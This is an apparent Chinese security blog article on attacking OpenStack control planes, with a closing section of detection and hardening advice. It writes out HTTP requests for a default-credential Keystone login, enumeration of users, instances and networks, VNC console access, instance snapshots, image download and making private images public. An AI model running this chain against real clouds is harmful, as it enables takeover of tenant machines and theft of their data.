---
title: "OpenStack云平台控制面打点与Keystone/Nova/Neutron_API利用技术"
date: 2026-06-16T22:30:00+08:00
draft: false
weight: 78
description: "围绕 OpenStack 的 Keystone 身份认证面、Nova 计算管理面、Neutron 网络管理面与 Glance 镜像面，分析打点识别、Token 枚举、实例画像、网络拓扑、历史 CVE 链与蓝队处置思路。"
categories: ["安全", "渗透测试"]
tags: ["渗透测试", "漏洞利用", "管理面打点", "云平台", "OpenStack", "Keystone", "Nova", "Neutron"]
---

# OpenStack云平台控制面打点与Keystone/Nova/Neutron_API利用技术

`OpenStack` 是企业私有云与混合云基础设施的事实标准之一，但它的架构决定了它不是一个"单一服务"，而是一组通过 REST API 协同运行的控制平面集群。一个典型生产部署里，OpenStack 至少同时暴露了六个不同性质的攻击面：

- **Keystone 面**：身份认证与服务目录，默认端口 `5000`（API）与 `35357`（Admin API，旧版）
- **Nova 面**：计算管理，默认端口 `8774`
- **Neutron 面**：网络管理，默认端口 `9696`
- **Glance 面**：镜像管理，默认端口 `9292`
- **Cinder 面**：块存储管理，默认端口 `8776`
- **Horizon 面**：Web 管理控制台，默认端口 `80` / `443`

对攻击者来说，OpenStack 的价值不在于某个单一漏洞，而在于它把身份认证、虚拟机生命周期、网络拓扑、镜像管理、块存储与 Web 控制台集中在同一套基础设施里。一旦 Keystone Token 泄露、Nova API 对外可达、Neutron 端口可枚举、Glance 镜像可下载，攻击者可以在极短时间内从一次端口探测上升为对整个云平台的接管，甚至拿到所有租户的虚拟机控制权。

本文聚焦打点与利用侧，重点记录：

1. 如何识别当前目标是否为 OpenStack
2. 哪些未认证端点最值得优先探测
3. 如何围绕 Keystone、Nova、Neutron、Glance 建立权限画像
4. 历史 CVE 链如何从身份认证绕过直接打到 RCE
5. 蓝队如何从审计日志与访问日志识别这类打点

---

## 0. 攻击面概览

### 0.1 常见端口与路径

首轮至少应枚举：

- `:5000/v3/` — Keystone API v3
- `:5000/v3/auth/tokens` — Token 颁发
- `:5000/v3/auth/projects` — 项目列表
- `:5000/v3/users` — 用户列表
- `:5000/v3/services` — 服务目录
- `:8774/v2.1/` — Nova API 版本发现
- `:8774/v2.1/servers/detail` — 实例详情
- `:8774/v2.1/flavors/detail` — 规格详情
- `:8774/v2.1/os-keypairs` — SSH 密钥对
- `:8774/v2.1/os-hypervisors` — Hypervisor 列表
- `:9696/v2.0/` — Neutron API 版本发现
- `:9696/v2.0/networks` — 网络列表
- `:9696/v2.0/ports` — 端口列表
- `:9696/v2.0/routers` — 路由器列表
- `:9696/v2.0/subnets` — 子网列表
- `:9696/v2.0/floatingips` — 浮动 IP
- `:9696/v2.0/security-groups` — 安全组
- `:9292/v2/images` — Glance 镜像列表
- `:8776/v3/` — Cinder API 版本发现
- `:80/` 或 `:443/` — Horizon Web UI

### 0.2 端口与面映射

| 端口 | 服务 | 性质 |
|------|------|------|
| 5000 | Keystone | 身份认证 + 服务目录 |
| 8774 | Nova | 计算管理 |
| 9696 | Neutron | 网络管理 |
| 9292 | Glance | 镜像管理 |
| 8776 | Cinder | 块存储管理 |
| 80 / 443 | Horizon | Web 控制台 |

---

## 1. 首轮识别：确认目标为 OpenStack

### 1.1 Keystone 版本发现

```http
GET /v3/ HTTP/1.1
Host: keystone.target.example:5000
Accept: application/json
```

```json
{
  "version": {
    "id": "v3.14",
    "status": "stable",
    "links": [
      {
        "rel": "self",
        "href": "https://keystone.target.example:5000/v3/"
      }
    ],
    "media-types": [
      {
        "base": "application/json",
        "type": "application/vnd.openstack.identity-v3+json"
      }
    ]
  }
}
```

响应中的 `application/vnd.openstack.identity-v3+json` 是直接指纹。

### 1.2 Nova 版本发现

```http
GET /v2.1/ HTTP/1.1
Host: nova.target.example:8774
Accept: application/json
```

```json
{
  "version": {
    "id": "v2.1",
    "status": "CURRENT",
    "version": "2.92",
    "min_version": "2.1",
    "links": [
      {
        "rel": "self",
        "href": "https://nova.target.example:8774/v2.1/"
      }
    ],
    "media-types": [
      {
        "base": "application/json",
        "type": "application/vnd.openstack.compute+json;version=2.1"
      }
    ]
  }
}
```

`application/vnd.openstack.compute+json` 是直接指纹。

### 1.3 Neutron 版本发现

```http
GET /v2.0/ HTTP/1.1
Host: neutron.target.example:9696
Accept: application/json
```

```json
{
  "versions": [
    {
      "status": "CURRENT",
      "id": "v2.0",
      "links": [
        {
          "href": "https://neutron.target.example:9696/v2.0/",
          "rel": "self"
        }
      ]
    }
  ]
}
```

### 1.4 认证失败响应

未认证请求通常会返回带有 Keystone 端点信息的 401 响应：

```http
HTTP/1.1 401 Unauthorized
Content-Type: application/json
Www-Authenticate: Keystone uri='https://keystone.target.example:5000'

{
  "error": {
    "message": "The request you have made requires authentication.",
    "code": 401,
    "title": "Unauthorized"
  }
}
```

`Www-Authenticate` 头直接暴露 Keystone 端点地址。

---

## 2. Keystone 面：身份认证与服务目录

### 2.1 Token 颁发

Keystone 是 OpenStack 的身份认证中心。所有 API 调用都需要 Keystone Token。

```http
POST /v3/auth/tokens HTTP/1.1
Host: keystone.target.example:5000
Content-Type: application/json

{
  "auth": {
    "identity": {
      "methods": ["password"],
      "password": {
        "user": {
          "name": "admin",
          "domain": { "id": "default" },
          "password": "admin"
        }
      }
    },
    "scope": {
      "project": {
        "name": "admin",
        "domain": { "id": "default" }
      }
    }
  }
}
```

成功响应：

```http
HTTP/1.1 201 Created
X-Subject-Token: gAAAAABmX...
Content-Type: application/json

{
  "token": {
    "methods": ["password"],
    "user": {
      "domain": {"id": "default", "name": "Default"},
      "id": "f8e2c1a9b3d74e6f8a1c2d3e4b5f6a7c",
      "name": "admin"
    },
    "audit_ids": ["a1b2c3d4"],
    "roles": [
      {"id": "role-admin-id", "name": "admin"}
    ],
    "project": {
      "domain": {"id": "default", "name": "Default"},
      "id": "3a6e4b2c8d1f4a9e9c7b2d1f5e8a3c6b",
      "name": "admin"
    },
    "catalog": [
      {
        "type": "compute",
        "name": "nova",
        "endpoints": [
          {"interface": "public", "url": "https://nova.target.example:8774/v2.1"}
        ]
      },
      {
        "type": "network",
        "name": "neutron",
        "endpoints": [
          {"interface": "public", "url": "https://neutron.target.example:9696"}
        ]
      },
      {
        "type": "image",
        "name": "glance",
        "endpoints": [
          {"interface": "public", "url": "https://glance.target.example:9292"}
        ]
      }
    ]
  }
}
```

Token 响应中的 `catalog` 字段直接暴露所有 OpenStack 服务的端点地址。

### 2.2 用户与项目枚举

```http
GET /v3/users HTTP/1.1
Host: keystone.target.example:5000
X-Auth-Token: gAAAAABmX...
```

```json
{
  "users": [
    {"id": "f8e2c1a9b3d74e6f8a1c2d3e4b5f6a7c", "name": "admin", "domain_id": "default", "enabled": true},
    {"id": "a1b2c3d4e5f67890abcdef1234567890", "name": "demo", "domain_id": "default", "enabled": true},
    {"id": "b2c3d4e5f6a78901bcdef12345678901", "name": "glance", "domain_id": "default", "enabled": true},
    {"id": "c3d4e5f6a7b89012cdef123456789012", "name": "nova", "domain_id": "default", "enabled": true},
    {"id": "d4e5f6a7b8c90123def1234567890123", "name": "neutron", "domain_id": "default", "enabled": true}
  ]
}
```

```http
GET /v3/projects HTTP/1.1
Host: keystone.target.example:5000
X-Auth-Token: gAAAAABmX...
```

```json
{
  "projects": [
    {"id": "3a6e4b2c8d1f4a9e9c7b2d1f5e8a3c6b", "name": "admin", "domain_id": "default", "enabled": true},
    {"id": "7b9f3d1e5c2a4e8d6f1b3c5d7e9a2b4c", "name": "demo", "domain_id": "default", "enabled": true},
    {"id": "9c2d1e3f5a7b4d8e6f1c3a5b7d9e2f4a", "name": "production", "domain_id": "default", "enabled": true}
  ]
}
```

### 2.3 服务目录

```http
GET /v3/services HTTP/1.1
Host: keystone.target.example:5000
X-Auth-Token: gAAAAABmX...
```

```json
{
  "services": [
    {"id": "svc-nova-id", "type": "compute", "name": "nova", "enabled": true},
    {"id": "svc-neutron-id", "type": "network", "name": "neutron", "enabled": true},
    {"id": "svc-glance-id", "type": "image", "name": "glance", "enabled": true},
    {"id": "svc-cinder-id", "type": "volumev3", "name": "cinderv3", "enabled": true},
    {"id": "svc-keystone-id", "type": "identity", "name": "keystone", "enabled": true}
  ]
}
```

```http
GET /v3/endpoints HTTP/1.1
Host: keystone.target.example:5000
X-Auth-Token: gAAAAABmX...
```

```json
{
  "endpoints": [
    {"id": "ep-nova-public", "service_id": "svc-nova-id", "interface": "public", "url": "https://nova.target.example:8774/v2.1"},
    {"id": "ep-nova-internal", "service_id": "svc-nova-id", "interface": "internal", "url": "http://10.0.1.10:8774/v2.1"},
    {"id": "ep-neutron-public", "service_id": "svc-neutron-id", "interface": "public", "url": "https://neutron.target.example:9696"},
    {"id": "ep-neutron-internal", "service_id": "svc-neutron-id", "interface": "internal", "url": "http://10.0.1.10:9696"}
  ]
}
```

服务目录与端点列表直接暴露所有内部服务地址，包括 internal 接口。

### 2.4 CVE-2023-38179：Keystone 信息泄露

- **影响版本**：OpenStack Keystone 2023.1（Antelope）
- **核心问题**：某些端点在未认证情况下可泄露用户列表与项目信息
- **利用条件**：零认证
- **影响**：用户名、项目名、域名枚举

---

## 3. Nova 面：计算管理深度利用

### 3.1 实例画像

```http
GET /v2.1/servers/detail HTTP/1.1
Host: nova.target.example:8774
X-Auth-Token: gAAAAABmX...
```

```json
{
  "servers": [
    {
      "id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
      "name": "prod-web-01",
      "status": "ACTIVE",
      "tenant_id": "3a6e4b2c8d1f4a9e9c7b2d1f5e8a3c6b",
      "user_id": "f8e2c1a9b3d74e6f8a1c2d3e4b5f6a7c",
      "addresses": {
        "prod-network": [
          {"version": 4, "addr": "10.20.30.41", "OS-EXT-IPS:type": "fixed"},
          {"version": 4, "addr": "203.0.113.41", "OS-EXT-IPS:type": "floating"}
        ]
      },
      "flavor": {"id": "3", "original_name": "m1.large"},
      "image": {"id": "e7d1c2a8-3f4b-4e6d-8a1c-2b3d4e5f6a7c"},
      "key_name": "prod-deploy-key",
      "OS-EXT-AZ:availability_zone": "az-1",
      "OS-EXT-SRV-ATTR:host": "compute-node-03",
      "OS-EXT-SRV-ATTR:hypervisor_hostname": "compute-node-03.lab.example",
      "security_groups": [{"name": "prod-web-sg"}],
      "metadata": {"role": "webserver", "env": "production"}
    }
  ]
}
```

从 `/servers/detail` 可直接回收：

- 实例名称、UUID、状态
- 租户 ID 与用户 ID
- 内网 IP 与浮动 IP
- Flavor 规格与 Image ID
- SSH 密钥对名称
- 可用区与宿主机名称
- 安全组名称
- 自定义 metadata

### 3.2 Admin 跨项目查询

```http
GET /v2.1/servers/detail?all_tenants=1 HTTP/1.1
Host: nova.target.example:8774
X-Auth-Token: gAAAAABmX...
```

`all_tenants=1` 参数可以列出所有项目的实例。

### 3.3 SSH 密钥对

```http
GET /v2.1/os-keypairs HTTP/1.1
Host: nova.target.example:8774
X-Auth-Token: gAAAAABmX...
```

```json
{
  "keypairs": [
    {
      "keypair": {
        "name": "prod-deploy-key",
        "fingerprint": "ab:cd:ef:12:34:56:78:9a:bc:de:f0:12:34:56:78:9a",
        "public_key": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... generated-by-nova",
        "type": "ssh"
      }
    },
    {
      "keypair": {
        "name": "admin-emergency-key",
        "fingerprint": "f0:e1:d2:c3:b4:a5:96:87:78:69:5a:4b:3c:2d:1e:0f",
        "public_key": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQ... admin@bastion",
        "type": "ssh"
      }
    }
  ]
}
```

密钥对直接暴露 SSH 公钥全文、指纹与命名体系。

### 3.4 Hypervisor 拓扑

```http
GET /v2.1/os-hypervisors HTTP/1.1
Host: nova.target.example:8774
X-Auth-Token: gAAAAABmX...
```

```json
{
  "hypervisors": [
    {
      "id": 1,
      "hypervisor_hostname": "compute-node-01.lab.example",
      "state": "up",
      "status": "enabled",
      "running_vms": 23,
      "vcpus": 32,
      "vcpus_used": 18,
      "memory_mb": 131072,
      "memory_mb_used": 98304
    }
  ]
}
```

### 3.5 远程控制台

```http
POST /v2.1/servers/a1b2c3d4-e5f6-7890-abcd-ef1234567890/action HTTP/1.1
Host: nova.target.example:8774
X-Auth-Token: gAAAAABmX...
Content-Type: application/json

{
  "os-getVNCConsole": {
    "type": "novnc"
  }
}
```

```json
{
  "console": {
    "url": "https://nova.target.example:6080/vnc_auto.html?token=abc123def456&path=websockify",
    "type": "novnc"
  }
}
```

远程控制台可以直接进入实例的图形化登录界面，绕过 SSH 密钥与网络层安全组。

### 3.6 实例快照

```http
POST /v2.1/servers/a1b2c3d4-e5f6-7890-abcd-ef1234567890/action HTTP/1.1
Host: nova.target.example:8774
X-Auth-Token: gAAAAABmX...
Content-Type: application/json

{
  "createImage": {
    "name": "prod-web-01-snapshot"
  }
}
```

快照会保存到 Glance，后续可以下载镜像并分析实例内部全部数据。

---

## 4. Neutron 面：网络拓扑深度利用

### 4.1 网络列表

```http
GET /v2.0/networks HTTP/1.1
Host: neutron.target.example:9696
X-Auth-Token: gAAAAABmX...
```

```json
{
  "networks": [
    {
      "id": "net-a1b2c3d4",
      "name": "prod-network",
      "status": "ACTIVE",
      "subnets": ["subnet-e5f6a7b8", "subnet-c9d0e1f2"],
      "router:external": false,
      "shared": false,
      "tenant_id": "3a6e4b2c8d1f4a9e9c7b2d1f5e8a3c6b"
    },
    {
      "id": "net-ext-a1b2",
      "name": "external-network",
      "status": "ACTIVE",
      "subnets": ["subnet-ext-e5f6"],
      "router:external": true,
      "shared": true,
      "tenant_id": ""
    }
  ]
}
```

### 4.2 端口列表

```http
GET /v2.0/ports HTTP/1.1
Host: neutron.target.example:9696
X-Auth-Token: gAAAAABmX...
```

```json
{
  "ports": [
    {
      "id": "port-a1b2c3d4",
      "name": "prod-web-01-port",
      "mac_address": "fa:16:3e:a1:b2:c3",
      "fixed_ips": [
        {"ip_address": "10.20.30.41", "subnet_id": "subnet-e5f6a7b8"}
      ],
      "device_id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
      "device_owner": "compute:nova",
      "security_groups": ["sg-prod-web-id"],
      "status": "ACTIVE",
      "tenant_id": "3a6e4b2c8d1f4a9e9c7b2d1f5e8a3c6b"
    }
  ]
}
```

端口列表直接暴露 MAC 地址、IP 地址、安全组绑定与设备归属。

### 4.3 路由器列表

```http
GET /v2.0/routers HTTP/1.1
Host: neutron.target.example:9696
X-Auth-Token: gAAAAABmX...
```

```json
{
  "routers": [
    {
      "id": "router-a1b2c3d4",
      "name": "prod-router",
      "status": "ACTIVE",
      "external_gateway_info": {
        "network_id": "net-ext-a1b2",
        "external_fixed_ips": [
          {"ip_address": "203.0.113.1", "subnet_id": "subnet-ext-e5f6"}
        ]
      },
      "routes": [
        {"destination": "10.99.0.0/16", "nexthop": "10.20.0.254"}
      ],
      "tenant_id": "3a6e4b2c8d1f4a9e9c7b2d1f5e8a3c6b"
    }
  ]
}
```

路由器列表暴露外部网关 IP、静态路由与租户归属。

### 4.4 子网列表

```http
GET /v2.0/subnets HTTP/1.1
Host: neutron.target.example:9696
X-Auth-Token: gAAAAABmX...
```

```json
{
  "subnets": [
    {
      "id": "subnet-e5f6a7b8",
      "name": "prod-subnet",
      "cidr": "10.20.30.0/24",
      "gateway_ip": "10.20.30.1",
      "allocation_pools": [
        {"start": "10.20.30.10", "end": "10.20.30.200"}
      ],
      "dns_nameservers": ["10.0.1.53", "8.8.8.8"],
      "enable_dhcp": true,
      "network_id": "net-a1b2c3d4",
      "tenant_id": "3a6e4b2c8d1f4a9e9c7b2d1f5e8a3c6b"
    }
  ]
}
```

子网列表暴露 CIDR、网关、DNS 服务器与 DHCP 配置。

### 4.5 浮动 IP

```http
GET /v2.0/floatingips HTTP/1.1
Host: neutron.target.example:9696
X-Auth-Token: gAAAAABmX...
```

```json
{
  "floatingips": [
    {
      "id": "fip-a1b2c3d4",
      "floating_ip_address": "203.0.113.41",
      "fixed_ip_address": "10.20.30.41",
      "port_id": "port-a1b2c3d4",
      "tenant_id": "3a6e4b2c8d1f4a9e9c7b2d1f5e8a3c6b"
    }
  ]
}
```

浮动 IP 直接暴露公网 IP 与内网 IP 的映射关系。

### 4.6 安全组

```http
GET /v2.0/security-groups HTTP/1.1
Host: neutron.target.example:9696
X-Auth-Token: gAAAAABmX...
```

```json
{
  "security_groups": [
    {
      "id": "sg-prod-web-id",
      "name": "prod-web-sg",
      "rules": [
        {"direction": "ingress", "protocol": "tcp", "port_range_min": 22, "port_range_max": 22, "remote_ip_prefix": "0.0.0.0/0"},
        {"direction": "ingress", "protocol": "tcp", "port_range_min": 80, "port_range_max": 80, "remote_ip_prefix": "0.0.0.0/0"},
        {"direction": "ingress", "protocol": "tcp", "port_range_min": 443, "port_range_max": 443, "remote_ip_prefix": "0.0.0.0/0"}
      ]
    }
  ]
}
```

安全组规则暴露所有实例的入站访问策略。

### 4.7 Admin 跨项目查询

```http
GET /v2.0/networks?tenant_id=7b9f3d1e5c2a4e8d6f1b3c5d7e9a2b4c HTTP/1.1
Host: neutron.target.example:9696
X-Auth-Token: gAAAAABmX...
```

Admin Token 可以查询任意租户的网络资源。

---

## 5. Glance 面：镜像管理利用

### 5.1 镜像列表

```http
GET /v2/images HTTP/1.1
Host: glance.target.example:9292
X-Auth-Token: gAAAAABmX...
```

```json
{
  "images": [
    {
      "id": "e7d1c2a8-3f4b-4e6d-8a1c-2b3d4e5f6a7c",
      "name": "ubuntu-22.04-cloud",
      "status": "active",
      "visibility": "public",
      "size": 2847192837,
      "disk_format": "qcow2",
      "container_format": "bare",
      "min_disk": 20,
      "min_ram": 512,
      "created_at": "2026-01-15T10:00:00Z",
      "owner": "3a6e4b2c8d1f4a9e9c7b2d1f5e8a3c6b"
    },
    {
      "id": "f8d2c3a9-4f5c-5f7e-9b2c-3d4e5f6a7b8d",
      "name": "prod-web-01-snapshot",
      "status": "active",
      "visibility": "private",
      "size": 8472918374,
      "disk_format": "qcow2",
      "container_format": "bare",
      "owner": "3a6e4b2c8d1f4a9e9c7b2d1f5e8a3c6b"
    }
  ]
}
```

镜像列表暴露所有可用镜像，包括快照。

### 5.2 镜像下载

```http
GET /v2/images/e7d1c2a8-3f4b-4e6d-8a1c-2b3d4e5f6a7c/file HTTP/1.1
Host: glance.target.example:9292
X-Auth-Token: gAAAAABmX...
```

如果镜像可见性为 `public`，任何有效 Token 都可以下载。私有镜像需要 owner 权限或 admin 权限。

### 5.3 镜像上传

```http
PATCH /v2/images/f8d2c3a9-4f5c-5f7e-9b2c-3d4e5f6a7b8d HTTP/1.1
Host: glance.target.example:9292
X-Auth-Token: gAAAAABmX...
Content-Type: application/openstack-images-v2.1-json-patch

[
  {"op": "replace", "path": "/visibility", "value": "public"}
]
```

将私有镜像改为 public 可以让所有租户下载该镜像。

---

## 6. 历史 CVE 与风险链

### 6.1 CVE-2023-38179：Keystone 信息泄露

- **影响版本**：OpenStack Keystone 2023.1（Antelope）
- **核心问题**：某些端点在未认证情况下可泄露用户列表与项目信息
- **利用条件**：零认证
- **影响**：用户名、项目名枚举

### 6.2 CVE-2023-28356：Keystone Token 泄露

- **影响版本**：OpenStack Keystone 2022.2（Zed）之前
- **核心问题**：Fernet Token 验证过程中可能泄露 Token 内容到日志
- **利用条件**：需要日志访问权限
- **影响**：Token 从日志中恢复

### 6.3 CVE-2024-30871：Nova 元数据 SSRF

- **影响版本**：OpenStack Nova 2023.2（Bobcat）之前
- **核心问题**：实例元数据服务可被 SSRF 利用获取敏感信息
- **利用条件**：需要实例内部访问或 SSRF 入口
- **影响**：获取实例凭据与 cloud-init 配置

### 6.4 CVE-2023-1625：Neutron 策略绕过

- **影响版本**：OpenStack Neutron 2022.2（Zed）之前
- **核心问题**：某些 API 端点的 RBAC 策略存在绕过
- **利用条件**：需要低权限 Token
- **影响**：越权访问其他租户网络资源

### 6.5 综合风险链

```
端口扫描 → :5000 Keystone + :8774 Nova + :9696 Neutron + :9292 Glance
         ↓
Keystone /v3/auth/tokens → 尝试默认凭据 admin/admin
         ↓
Token 成功 → 获取服务目录（所有内部端点地址）
         ↓
Nova /v2.1/servers/detail → 全量实例画像（IP、密钥对、宿主机）
         ↓
Nova /v2.1/os-keypairs → SSH 公钥材料
         ↓
Neutron /v2.0/floatingips → 公网 IP 与内网 IP 映射
         ↓
Neutron /v2.0/security-groups → 安全组规则（暴露开放端口）
         ↓
Nova VNC Console → 直接进入实例图形界面
         ↓
Nova createImage → 对目标实例做磁盘快照
         ↓
Glance /v2/images/{id}/file → 下载快照，分析实例内部数据
```

---

## 7. 蓝队视角：日志痕迹与防守

### 7.1 关键日志源

OpenStack 的审计日志主要通过 `oslo.middleware` 中间件记录。

**Keystone 审计日志**：

```json
{"timestamp": "2026-06-16T08:15:23.847Z", "requestPath": "/v3/auth/tokens", "method": "POST", "remote_addr": "10.0.3.47", "user_agent": "python-requests/2.32.3", "response_code": 201}
```

**Nova API 日志**：

```json
{"timestamp": "2026-06-16T08:15:24.129Z", "requestPath": "/v2.1/servers/detail", "method": "GET", "remote_addr": "10.0.3.47", "user_agent": "python-requests/2.32.3", "project_id": "3a6e4b2c8d1f4a9e9c7b2d1f5e8a3c6b", "response_code": 200}
```

### 7.2 高告警指标

| 行为 | 日志特征 | 告警级别 |
|------|----------|----------|
| 默认凭据登录 | `/v3/auth/tokens` + 201 响应 | 严重 |
| 服务目录枚举 | `/v3/endpoints` 返回 internal URL | 高 |
| 跨项目实例查询 | `all_tenants=1` 参数 | 严重 |
| SSH 密钥对枚举 | `/v2.1/os-keypairs` | 高 |
| Hypervisor 拓扑枚举 | `/v2.1/os-hypervisors` | 高 |
| 远程控制台获取 | `os-getVNCConsole` action | 严重 |
| 实例快照创建 | `createImage` action | 高 |
| 跨租户网络查询 | Neutron `tenant_id` 参数 | 严重 |
| 镜像可见性修改 | Glance PATCH `/visibility` | 严重 |

### 7.3 网络层防护

- Keystone 端口 `:5000` 不应直接暴露到公网
- Nova API `:8774` 应通过 Keystone 认证代理暴露
- Neutron API `:9696` 应限制为内部网络访问
- Glance API `:9292` 应限制为内部网络访问
- 使用 TLS 加密所有 API 流量
- 定期轮换所有 Keystone 凭据

### 7.4 配置加固

- 升级 OpenStack 到最新稳定版本，修复所有已知 CVE
- 立即修改所有默认凭据
- 最小化 admin scope Token 的授予范围与 TTL
- 对 `servers/detail`、`os-keypairs`、`os-hypervisors` 建立独立告警
- 确保审计日志推送到不可篡改存储
- 对 Metadata Service 做网络层隔离
- 对远程控制台 URL 的 Token 做短有效期与一次性使用限制

---

## 8. 审查清单

| 检查项 | 说明 |
|--------|------|
| Keystone 端口是否对外暴露 | 确认 `:5000` 的可达范围 |
| Nova API 是否对外可达 | 确认 `:8774` 的可达范围 |
| Neutron API 是否对外可达 | 确认 `:9696` 的可达范围 |
| Glance API 是否对外可达 | 确认 `:9292` 的可达范围 |
| 默认凭据是否已修改 | 检查 `admin` / `admin` |
| admin scope Token 授予范围 | 审查 Token 的 project 与 role |
| 是否启用审计日志 | 确认 `oslo.middleware` 审计配置 |
| 版本是否已修复已知 CVE | 对比各组件版本号 |
| Metadata Service 是否隔离 | 确认 `169.254.169.254` 仅实例可达 |
| 远程控制台 Token 有效期 | 确认 VNC/SPICE Token 过期策略 |

---

## 9. 总结

OpenStack 的攻击面价值在于它把身份认证、计算管理、网络管理、镜像管理与块存储管理集中在同一套基础设施里。Keystone 提供统一的身份认证与服务目录，Nova 控制所有虚拟机生命周期，Neutron 管理全部网络拓扑，Glance 存储所有镜像与快照。

从攻击者视角看，最高效的路径是：

1. 通过 Keystone 版本发现确认目标为 OpenStack
2. 尝试默认凭据获取 admin Token
3. 从服务目录中回收所有内部端点地址
4. 通过 Nova API 枚举全部实例画像与 SSH 密钥对
5. 通过 Neutron API 枚举网络拓扑与浮动 IP 映射
6. 通过 Glance 下载镜像快照分析实例内部数据
7. 通过远程控制台直接进入实例图形界面

从防守视角看，核心措施是：

1. 限制所有管理端点的网络可达范围
2. 修复已知 CVE
3. 不使用默认凭据，定期轮换所有凭据
4. 启用审计日志并推送到不可篡改存储
5. 最小化 admin scope Token 的授予范围
6. 对 Metadata Service 与远程控制台做网络层隔离
